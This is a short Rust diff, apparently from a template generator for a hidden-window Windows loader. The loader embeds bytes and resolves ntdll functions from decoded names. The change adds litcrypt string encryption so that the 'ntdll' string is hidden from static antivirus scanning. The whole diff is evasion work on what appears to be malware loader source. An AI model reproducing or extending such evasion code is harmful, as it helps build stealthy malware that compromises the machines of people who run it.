@@ -1,6 +1,8 @@
 #![windows_subsystem = "windows"] 
 #![allow(non_snake_case)]
 
+{{LITCRYPT_SETUP}}
+
 use std::ffi::CString;
 use std::include_bytes;
 use std::ptr::null_mut;
@@ -39,7 +41,8 @@ fn r(d: &[u8]) -> Vec<u8> {
 }
 
 unsafe fn g(n: &[u8]) -> *const () {
-    let h = GetModuleHandleA(b"ntdll\0".as_ptr() as *const i8);
+    let ntdll = CString::new(lc!("ntdll")).unwrap();
+    let h = GetModuleHandleA(ntdll.as_ptr());
     let s = r(n);
     let c = CString::new(s).unwrap();
     GetProcAddress(h, c.as_ptr()) as *const ()
